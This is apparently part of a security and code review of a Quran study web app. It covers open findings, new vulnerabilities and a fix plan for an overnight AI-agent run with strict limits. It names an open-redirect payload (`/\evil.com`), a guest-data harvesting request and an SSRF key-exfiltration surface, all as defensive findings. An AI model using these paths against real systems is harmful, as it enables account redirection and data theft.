- **Phase 0: zero of eight items done.** `git diff 764ae37..develop -- docker-compose.yml Dockerfile.api .github .gitignore requirements.txt package.json` is **empty**. `data/quran.db` still tracked (92 MB on origin/main, 176 MB working copy, still `M`), no CI workflow, deploy still rebuilds with the stale image and still `reset --hard`s the prod DB, dev-default session secret still in compose, no backups, liveness-only health check, and the client still sends `X-QBasair-Ollama-Base-Url: https://ollama.com` by default (`research-client-settings.ts:12-17`). **The identity work raises the stakes**: `auth.db`/`app_data.db` now hold real accounts and user data with no backup automation, and the new account tests depend on undeclared deps (`pytest`/`httpx`) that no CI would catch.
- **Phase 1 (backend correctness/perf): all open.** SSRF/key-exfil intact (`research_agent_service.py:834`, https-only key guard at `:845-846`, upstream bodies still reflected); phrase-metadata still uncached with the double scan; no cache/connection locking; expand/plan-stage JSON failures still 502 (finalize fallbacks exist); `filter_ayahs_by_review` still `filtered or ayahs`; `QBASAIR_DB_PATH` still ignored; no rate limiting; login timing oracle intact; `/api/health` still DB-blind; `ResearchSessionSave.messages` still unbounded — now guest-reachable. Two partials: the ollama.com catalog now has a 30-min TTL cache with failure-through (cold path still sequential in-request), and `docs/api-contract.md` now documents auth (companions/surahs/reciters/root-distribution still missing from the stable list).
- **Phase 1b (frontend correctness/perf): mostly open.** Still open: `runSearch` stale-response race, unmemoized `WorkspaceProvider` (+120 ms focus poll re-rendering everything), font-size PATCH-per-pixel, research defaults in Settings ignored by `createSession()` (Settings now *writes* `research.default_mode` — nothing reads it), reciter pref dead (`recitation-context.tsx:69`), Studio thread no auto-scroll, ~200 lines dead workspace state, Google Fonts `@import`, zero tests/ESLint. Partial: URL-race restructured but two writers remain; ShortcutsModal/ReciterDropdown got Escape (ExportModal didn't; no dialog traps focus); FOUC fixed but BrandMark still hydrate-mismatches for light-theme users; one of three stray timers cleared.
- **The tafssir-safety trio survived untouched** (all S-effort): the disclaimer still says «قراءة تفسيرية **بشرية** مُولَّدة من نموذج لغوي» (`tafssir-disclaimer.tsx:4`), the export disclaimer checkbox is still uncheckable-off for tafssir sessions, and Tafssir-as-default still needs no confirmation.
- **Compact ≤1000 px dead end still open** — and now self-documented: the new evidence-thread animation explicitly no-ops at ≤1000 px (`draw-evidence-thread.ts:39`) while the jump target isn't even mounted (`workspace-canvas.tsx:38-39`). `setWorkspaceView("reader")` fires into dead state.

### 10.3 NEW findings introduced by the new code

| Sev | Finding | Where |
|---|---|---|
| **HIGH** | **Cross-tenant guest-data harvesting via merge**: all anonymous visitors share `user_id=0`; `POST /api/auth/merge-guest-data` with an empty/omitted id list moves **every** user-0 row (notebook, sessions, roots, preferences) to the caller. Any authenticated user posting `{}` claims all other guests' data. Code comment assumes "single-guest deployments" — production isn't. No test asserts merge scoping. | `app_data_service.py:351-364, 411-424`, `routes/auth.py:185-195` |
| **MED-HIGH** | **Open redirect after login via backslash**: `sanitizeNextPath` rejects `//` but accepts `/\` — `/login?next=/\evil.com` → `location.assign` normalizes to `//evil.com`. | `features/auth/identity-flow.ts:44-49, 95, 101` |
| **MED** | **Invite gate is decorative + signup enumeration + no rate limit**: `invite_code` accepted but never enforced; 409 reflects the email ("User '<email>' already exists"); no throttle on signup/login. Open self-registration also weakens the Studio gate that fronts the SSRF surface. | `models/api.py:25-26`, `routes/auth.py:108-124` |
| **MED** | **Session cookie `Secure` off by default** (`QBASAIR_SESSION_SECURE:-0` in compose) — auth cookie sendable over plaintext unless the operator flips it. | `config.py:158-159`, `auth.py:46`, compose:23 |
| **MED** | **Device eject silently swallows failure**: optimistic removal + `catch {/* ignore */}` — the device vanishes from the list while its session stays alive. False success on a security surface. | `account-settings.tsx:145-152` |
| **MED** | **Merge is once-per-account-per-browser**: the `qb.merged.{userId}` localStorage flag means guest data created after the first merge is stranded at user-0 forever. | `identity-flow.ts:58-59` |
| **LOW-MED** | `auth.db` write on every authenticated request (sliding window) + DDL re-run per call, no `busy_timeout` → lock contention risk; CSRF = SameSite Lax only; account-menu popover has no Escape/focus handling; onboarding finish not atomic (merge can run while `onboarded` flag fails); forgot-password button renders but has no handler; error-report payload captures full URL (query strings) — strip to pathname before enabling the POST transport. | various (see agent logs) |
| **NOTE** | The itsdangerous session secret is currently **latent** — the new auth uses random opaque tokens, and `request.session` is used nowhere — so "forgeable cookies" is no longer immediate; keep the hardening (fail-hard on default secret) since any future `request.session` use would be silently weak. | `factory.py:82-88` |

### 10.4 Plan v2 — what remains, re-sequenced

**Phase 0′ — before exposing `develop` to anyone (≈2–3 days, all S):**
0.1 SSRF/key-exfil closure (allowlist + no server-key fallback + truncate reflected bodies) · 0.2 untrack `quran.db` (+server coordination) · 0.3 deploy reorder (build before rebuilds) · 0.4 secret hardening + `QBASAIR_SESSION_SECURE:-1` + fail-hard defaults · 0.5 CI gate (pytest + web build; declare pytest/httpx) · 0.6 nightly backups — **now includes `auth.db` + `app_data.db`** · 0.7 DB-aware health + retry-loop deploy check · 0.8 client research-settings default to `""` · **0.9 scope guest merge** (per-guest identity or at minimum require explicit ids + cap; add a scoping test) · **0.10 fix `sanitizeNextPath` backslash bypass** · **0.11 enforce or remove `invite_code`; rate-limit signup/login; de-reflect the 409; surface device-eject failures**.

**Phase 1′ — correctness & perf (unchanged from §8 Phase 1 + 1b, minus 1b.9 done):** backend items 1.1–1.10 all still valid; frontend 1b.1–1b.8, 1b.10 still valid. Add: wire `research.default_mode`/`depth` into `createSession` (Settings already writes them); wire the `reciter` pref into `recitation-context`; extend error sanitization from the reader into Studio + Concordance (pipeline exists — wiring only).

**Phase 2′ — UX remainder:** 2.1 compact verse/evidence tap → `setMode("reading")` (delete dead `workspaceView`; un-skip the evidence thread ≤1000 px or design its compact variant) · 2.3 tafssir-safety trio (copy fix, forced export disclaimer, default-mode confirmation) · 2.4b soften the ≥6-words rule + make the intent chip screen-reader-visible (it's `aria-hidden` at the exact moment Enter's behavior forks) · 2.5 evidence persistence server-side (sessionStorage half exists) · 2.9 form chips · 2.10 pinned-context handoff · guest education variant of onboarding + skip affordance · re-runnable merge (drop the localStorage flag; server-side idempotency instead).

**Phase 3 (hardening/observability) and Phase 4 (bets): unchanged** — nothing moved. Follow-along recitation (4.1) got its substrate (redesigned bar, auto-advance) but no reader highlight yet.

**Phase 5 remainder (was "essentially shipped"):** password reset (dead «نسيتها؟» button), invite enforcement (or honest removal), per-user storage caps (5.3 — now guest-reachable), account-deletion path, single shared session-probe (three components fetch `getAuthSession` independently; rename doesn't refresh the rail).

### 10.4b Plan review for autonomous (overnight) execution — 2026-07-06

The plan was re-reviewed for unattended execution. Three corrections, five pre-made decisions, and a hard safety boundary:

**Corrections to the plan:**
1. **0.9 (merge scoping) was mis-sized as S — it is M, and "require explicit ids" is NOT a fix** (row ids are guessable integers; authorization is the problem, not the parameter shape). Correct fix: introduce a **guest identity** — a random device token stored client-side, stamped on all guest (`user_id=0`) writes in a new `guest_id` column, and merge moves only rows matching the caller's presented guest token. This also fixes the once-per-browser stranding (10.3): merge becomes naturally idempotent and re-runnable, so the `qb.merged.{userId}` localStorage flag can be deleted in the same slice.
2. **0.2 (untrack quran.db) hides a production landmine**: when the untrack commit reaches the server, `git reset --hard origin/main` transitions the file from tracked→deleted and **removes `data/quran.db` from the server's working tree** while containers hold it open. Sequencing is mandatory: **0.3 (deploy reorder) must merge first**, and the untrack commit must carry `[rebuild-db]` so the DB is regenerated in the same deploy. This merge must be human-supervised — never overnight.
3. **0.7 (DB-aware health) must not break container boot**: the compose healthcheck and first-boot rebuild race — keep `/api/health` as pure liveness for the container healthcheck and add a separate `/api/ready` (DB `SELECT 1` + commit SHA) for the deploy gate.

**Decisions pre-made so the run doesn't stall:**
- **0.1/0.8**: safe and behavior-preserving — server env already defaults to the same `https://ollama.com` (`config.py:126`), so removing client default headers changes nothing for the current setup. Rule: client `base_url` override → never attach the server key, and only https + allowlisted hosts (`ollama.com` + `QBASAIR_OLLAMA_ALLOWED_HOSTS`) are honored.
- **0.11 invite**: enforce-when-configured — new `QBASAIR_INVITE_CODES` (comma-separated); when unset, signup stays open (current behavior); when set, wrong/missing code → 403 with Arabic detail. No silent removal of the field.
- **Rate limiting**: no new dependency — small in-memory sliding-window middleware (per-IP) on `/api/auth/login`, `/api/auth/signup`, `/api/research-agent`; single-process uvicorn makes this sufficient for now.
- **0.4 secrets**: `create_app` raises at startup if `QBASAIR_AUTH_ENABLED=1` and the session secret is the dev default; compose gets `${QBASAIR_SESSION_SECRET:?}` and `QBASAIR_SESSION_SECURE:-1`; the *code* default for `SECURE` stays 0 so local http dev keeps working.
- **Signup 409**: static Arabic message, no email reflection; login gets the dummy-hash timing fix in the same slice (it shares the file).

**Hard boundary for the overnight run (what the agent must NOT do):**
- No push/merge to `main` or `develop`; all work on one branch: `fix/Q-Basair-7-phase-0-durcissement`, commits `fix|chore: [Q-Basair-7] - …`, one logical change per commit.
- No server operations (Hetzner), no history rewrite (`filter-repo`), no DB rebuilds, no `docker compose` invocations.
- Items 0.2/0.3/0.5/0.6 are **author-and-verify-locally only**: write the CI workflow, the reordered deploy.yml, the backup script + install doc, and the untrack commit — but their activation (push, merge to main, server install) is explicitly left to the owner, documented in the close-out.

**Execution order (risk-ascending) with acceptance gates:**
1. 0.10 open-redirect fix (+ unit-style test of `sanitizeNextPath`) → web build passes.
2. 0.8 client research defaults to `""` → web build; grep proves no default headers sent.
3. 0.1 SSRF closure + reflected-body truncation → new pytest cases: header without key never carries server key; http/non-allowlisted base_url rejected; 503 detail ≤200 chars.
4. 0.4 secret/cookie hardening → pytest: startup raises on default secret + auth on.
5. 0.11 invite + rate limit + 409 de-reflection + timing fix + device-eject error surfacing (UI toast) → pytest for each.
6. 0.9 guest_id merge scoping (schema migration additive, `ALTER TABLE ... ADD COLUMN guest_id`) → pytest: user A cannot claim user B's guest rows; merge idempotent; undo intact.
7. 0.12 storage caps (`ResearchSessionSave.messages` count/size bounds — pulled forward from 5.3 since guests reach it) → pytest 422 on oversized payloads.
8. 0.7 `/api/ready` → pytest.
9. 0.5 author `ci.yml` + `requirements-dev.txt` (pytest, httpx) + pin `requirements.txt` → run the exact CI commands locally.
10. 0.3 + 0.2 + 0.6 authored artifacts + a `docs/phase-0-rollout.md` runbook for the human-supervised steps.
Full close: `$env:PYTHONPATH='.'; pytest -q` green + `scripts/build_web.ps1` green + updated `docs/api-contract.md` for touched contracts.

### 10.4c All-phases autonomous run — master backlog (2026-07-06)

Owner decision: one autonomous overnight run over **all** phases. This section is the executable spec; it supersedes per-phase sequencing for that run. Reality check baked in: the full backlog is weeks of human-scale work — the run works the ordered tiers below and **stops gracefully wherever the night ends**; an unreached item costs nothing, a badly-done item costs a review cycle. Quality gates are never sacrificed for coverage.

**Operating rules (constitution for the run):**
1. One branch: `feat/Q-Basair-7-nuit-production` off `develop`. One item = one commit (`fix|feat|chore: [Q-Basair-7] - …`). Never push/merge to `main` or `develop`. No server ops, no history rewrite, no docker, no DB rebuilds.
2. **Ledger**: maintain `docs/night-run-ledger.md` — one line per item (`done <commit sha>` / `skipped <reason>` / `blocked <reason>`), updated immediately after each item. On restart/compaction, resume from the ledger, never redo green items.
3. **Gates**: backend slice → `$env:PYTHONPATH='.'; pytest -q` green; frontend slice → web build green (+ Vitest once T2 lands). A red gate blocks the next item until fixed or the item is reverted and marked `blocked` in the ledger. Never `git push`, never skip hooks, never delete failing tests.
4. **Decision defaults**: where the plan pre-made a decision (§10.4b) use it; for new ambiguity, choose the smallest behavior-preserving option and record it in the ledger. Product-taste decisions (visual design, copy tone beyond documented fixes) → prefer the design handoff + existing register; if genuinely open, implement the conservative option and flag it in the close-out.
5. Contract discipline (AGENTS.md): any touched response shape updates `src/app/models/api.py` + `packages/shared` + `packages/api-client` + `docs/api-contract.md` + tests in the same commit.
6. Items tagged **[artifact]** are authored + locally verified but not activated (their rollout is human-only, collected in `docs/phase-0-rollout.md`). Items tagged **[stretch]** may be downgraded to a design note in the ledger if the implementation exceeds ~2h or fights the codebase.

**Tier order:**

- **T1 — Security & pipeline (= §10.4b order 1–10, unchanged).** Open-redirect fix → client research defaults → SSRF closure → secret/cookie hardening → invite + rate limit + 409 + timing + device-eject surfacing → guest_id merge scoping → storage caps → `/api/ready` → ci.yml + pinned deps [artifact] → deploy reorder + untrack commit + backup script + rollout runbook [artifact].
- **T2 — Test harness bootstrap.** Vitest + minimal config in `apps/web`; first tests: `sanitizeNextPath`, `looksLikeQuestion`, numerals, suggestion dedupe. (Early because it gates every later frontend slice.) ESLint deliberately deferred to T7 — first-lint churn would eat the night.
- **T3 — Backend correctness/perf (§8 Phase 1, all still valid).** Phrase-metadata cache + kill double scan → `QBASAIR_DB_PATH` read → cache/connection locking (per-thread read-only connections) → expand/plan JSON fallbacks + `filter_ayahs_by_review` empty-set fix → bound did-you-mean caches + low-memory cache-not-skip → catalog scrape off request path → stop sending `source_path` to the LLM → api-contract stable-list completion + `SuggestionItem` drift.
- **T4 — Frontend correctness/perf (§8 Phase 1b minus done 1b.9).** `runSearch` sequence guard + single URL writer → context memoization/split + kill 120 ms poll (verify with React profiler notes in ledger) → font-size PATCH debounce → wire `research.default_mode`/`depth` into `createSession` → wire `reciter` pref → Studio thread auto-scroll → BrandMark hydration fix → `rootFollowed` reset/seed (+ pin-state seeding) → dead-state purge → extend error sanitization to Studio + Concordance → remaining timer/listener cleanups + filled icons.
- **T5 — UX remainder (§10.4 Phase 2′).** Compact verse/evidence tap → `setMode("reading")` + back affordance (delete `workspaceView`; evidence-thread compact variant or clean skip) → tafssir-safety trio (copy «آلية», forced export disclaimer for tafssir, default-mode confirmation) → intent rule softening (6-word rule requires interrogative or ؟; chip made SR-visible) → evidence persistence server-side (versioned `StoredMessage` in shared; restore rebuilds cards) → dialog a11y (shared `useDialog`: focus trap, `aria-modal`, Escape, restore) + `aria-pressed` on strict/tafssir tabs + settings segments + MoreSheet keyboard fix → guest onboarding variant + skip affordance → form chips (backend form-grouping endpoint + concordance chips) → pinned-context handoff [stretch].
- **T6 — Identity completion (Phase 5 remainder).** Password reset (token flow; delivery = console/manual for now, UI wired) → account deletion (erase user rows + sessions; confirmation modal) → unified session probe (one context; rename refreshes rail) → error-report URL → pathname strip.
- **T7 — Hardening artifacts.** compose log-rotation + resource limits [artifact] → deploy image tagging + rollback runbook [artifact] → Sentry-shaped error hook behind env flag (no real DSN) → self-host Cairo/Reem Kufi/Amiri (woff2, replace `@import`) → CSP (verify the theme pre-paint inline script survives — use a nonce or hash; verify with `next start` on a free port) → repo cleanup commit (GEMINI.md, tracked logs, `quran narrations/` relocation under `data/` with provenance note) → ESLint + minimal config, fix errors only [stretch].
- **T8 — Product bets, in this order.** 4.1 follow-along recitation (reader highlights + autoscrolls `recitation.current`; verse markers on seek) → 4.5 riwayah-mismatch notice in التلاوة → 4.2 PDF export [stretch] → 4.3 ḥifẓ-mode MVP behind a flag [stretch] → 4.4 i18n foundation [stretch]. Anything unreached → one-paragraph design note in the ledger.

**Close-out:** ledger complete; full `pytest -q` + web build + Vitest green; `docs/api-contract.md` current; final report appended to the ledger with per-tier completion %, blocked items, decisions taken, and the exact human-only rollout steps.

### 10.5 Bottom line

The 31 commits were feature excellence — Phase 5 and the motion brief landed at high quality (sound token crypto, disciplined animation, real tests). But **every load-bearing production risk from the original review is still standing**, three got heavier (secrets/backups/CI now guard real user data), and the new surface added one HIGH (guest-pool merge harvesting) and one MED-HIGH (login open redirect). Phase 0′ is still the only sane first slice — now 11 small items instead of 8 — and none of it conflicts with the feature work.
